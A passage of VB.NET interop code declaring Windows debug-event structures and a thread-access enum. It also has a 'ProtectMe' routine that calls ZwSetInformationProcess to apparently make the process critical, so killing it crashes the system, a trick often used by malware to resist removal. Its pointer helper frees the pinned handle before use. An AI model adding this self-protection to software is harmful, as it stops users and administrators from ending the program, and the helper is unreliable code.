        Public ExceptionAddress As IntPtr
        Public NumberParameters As UInteger
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=15, ArraySubType:=UnmanagedType.U4)> _
        Public ExceptionInformation As UInteger()
    End Structure

    Public Structure EXIT_THREAD_DEBUG_INFO
        Public dwExitCode As UInteger
    End Structure

    Public Structure EXIT_PROCESS_DEBUG_INFO
        Public dwExitCode As UInteger
    End Structure

    Public Structure UNLOAD_DLL_DEBUG_INFO
        Public lpBaseOfDll As IntPtr
    End Structure

    Public Structure OUTPUT_DEBUG_STRING_INFO
        <MarshalAs(UnmanagedType.LPStr)> _
        Public lpDebugStringData As String
        Public fUnicode As UShort
        Public nDebugStringLength As UShort
    End Structure

    Public Structure LOAD_DLL_DEBUG_INFO
        Public hFile As IntPtr
        Public lpBaseOfDll As IntPtr
        Public dwDebugInfoFileOffset As UInteger
        Public nDebugInfoSize As UInteger
        Public lpImageName As IntPtr
        Public fUnicode As UShort
    End Structure

    Public Structure CREATE_PROCESS_DEBUG_INFO
        Public hFile As IntPtr
        Public hProcess As IntPtr
        Public hThread As IntPtr
        Public lpBaseOfImage As IntPtr
        Public dwDebugInfoFileOffset As UInteger
        Public nDebugInfoSize As UInteger
        Public lpThreadLocalBase As IntPtr
        Public lpStartAddress As PTHREAD_START_ROUTINE
        Public lpImageName As IntPtr
        Public fUnicode As UShort
    End Structure

    Public Structure RIP_INFO
        Public dwError As UInteger
        Public dwType As UInteger
    End Structure

    Public Delegate Function PTHREAD_START_ROUTINE(lpThreadParameter As IntPtr) As UInteger

	end class

Public Class ProtectMe
    <DllImport("Kernel32.dll")> _
    Private Shared Function GetCurrentProcess() As IntPtr
    End Function
    <DllImport("ntdll.dll")> _
    Private Shared Function ZwSetInformationProcess(ByVal _1 As IntPtr, ByVal _2 As IntPtr, ByVal _3 As IntPtr, ByVal _4 As IntPtr) As IntPtr
    End Function
    Public Shared Sub Protect()
        ZwSetInformationProcess(GetCurrentProcess(), &H21&, VarPtr(&H8000F129), &H4&)
    End Sub
    'Credits: vikky @ Stack Overflow
    Private Shared Function VarPtr(ByVal e As Object) As Integer
        Dim GC As GCHandle = GCHandle.Alloc(e, GCHandleType.Pinned)
        Dim GC2 As Integer = GC.AddrOfPinnedObject.ToInt32
        GC.Free()
        Return GC2
    End Function
End Class
<Flags()> _
Public Enum ThreadAccess As Integer
    TERMINATE = (&H1)
    SUSPEND_RESUME = (&H2)
    GET_CONTEXT = (&H8)
    SET_CONTEXT = (&H10)
    SET_INFORMATION = (&H20)
    QUERY_INFORMATION = (&H40)
    SET_THREAD_TOKEN = (&H80)
    IMPERSONATE = (&H100)
    DIRECT_IMPERSONATION = (&H200)
End Enum
